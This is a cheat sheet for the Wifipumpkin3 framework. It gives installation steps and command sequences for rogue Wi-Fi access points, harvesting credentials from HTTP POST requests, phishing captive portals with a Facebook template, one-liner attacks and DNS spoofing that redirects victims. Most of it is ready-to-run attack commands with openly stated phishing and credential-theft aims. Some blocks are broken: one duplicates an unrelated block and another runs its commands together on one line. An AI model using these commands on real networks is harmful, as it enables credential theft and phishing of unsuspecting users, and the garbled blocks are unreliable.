# wifipumpkin3

## Wifipumpkin3

***

Wifipumpkin3 is a powerful framework for conducting rogue access point attacks, man-in-the-middle attacks, and more. It's a valuable tool for security researchers, red teamers, and reverse engineers. Here's a cheat sheet to help you get started with Wifipumpkin3.

### Installation

Before using Wifipumpkin3, you need to install the necessary dependencies and set up the tool.

#### Installing Dependencies

```jsx
apt install libssl-dev libffi-dev build-essential
```

#### Clone Wifipumpkin3 Repository

```bash
git clone <https://github.com/P0cL4bs/wifipumpkin3.git> 
cd wifipumpkin3 
apt install python3-pyqt5
```

#### Additional Python Dependencies

```bash
python3 -c "from PyQt5.QtCore import QSettings; print('done')" 
python3 setup.py install
```

### Creating a Fake Access Point

***

To create a fake access point and perform a man-in-the-middle attack

```bash
wifipumpkin3 set interface wlan0 
wifipumpkin3 set ssid "Free Wifi" 
wifipumpkin3 set proxy noproxy 
wifipumpkin3 ignore pydns_server 
wifipumpkin3 start
```

### Capturing HTTP Post Requests

***

Capture HTTP POST requests to harvest user credentials

```bash
wifipumpkin3 set interface wlan0 
wifipumpkin3 set ssid "Free Wifi" 
wifipumpkin3 set proxy noproxy 
wifipumpkin3 ignore pydns_server 
wifipumpkin3 start
```

### Creating a Captive Portal

***

Create a secure captive portal for phishing attacks

```bash
wifipumpkin3 set interface wlan0 wifipumpkin3 set ssid "Hotspot" wifipumpkin3 set proxy captiveflask true wifipumpkin3 ignore pydns_server wifipumpkin3 start
```

### Using Custom Captiveflask Templates

***

Use custom captiveflask templates for phishing attacks

```bash
wifipumpkin3 set interface wlan0 
wifipumpkin3 set ssid "Open Wifi" 
wifipumpkin3 set proxy captiveflask 
wifipumpkin3 set captiveflask.facebook true 
wifipumpkin3 ignore pydns_server 
wifipumpkin3 start
```

### Writing Pulp Scripts

***

Automate commands with Pulp scripts for faster execution

```bash
# Create a Pulp script (e.g., demo.pulp) 
nano demo.pulp 
# Run the Pulp script 
wifipumpkin3 --pulp demo.pulp
```

### One-Liner Attack

***

Execute commands in one line for quick attacks

```bash
wifipumpkin3 --xpulp "set interface wlan0; set ssid nisha; set proxy noproxy; start"
```

### DNS Spoofing

***

Spoof DNS servers to redirect victims to malicious sites

```bash
wifipumpkin3 set interface wlan0
wifipumpkin3 set ssid "HA" 
wifipumpkin3 set proxy noproxy
wifipumpkin3 ignore pydns_server
wifipumpkin3 set domains vulnweb.com
wifipumpkin3 set redirectTo 192.168.1.2
wifipumpkin3 start
```
